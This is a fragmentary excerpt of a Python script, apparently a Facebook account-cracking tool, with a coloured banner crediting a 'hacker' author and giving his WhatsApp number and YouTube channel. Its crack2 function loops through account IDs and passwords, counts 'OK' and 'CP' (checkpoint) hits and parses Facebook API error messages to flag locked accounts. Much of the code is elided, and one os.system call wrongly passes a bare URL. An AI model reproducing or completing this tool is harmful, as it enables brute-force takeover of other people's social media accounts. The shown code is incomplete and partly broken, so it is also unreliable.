...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mMd Purno Shah
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801756462587
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mPicchi hacker
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/@darkman.p")
		exit()
	else:
		os.system("https://youtube.com/@darkman.p")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [ Purno ] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [Purno-CP] %s|%s        '%(b,idf,pw))
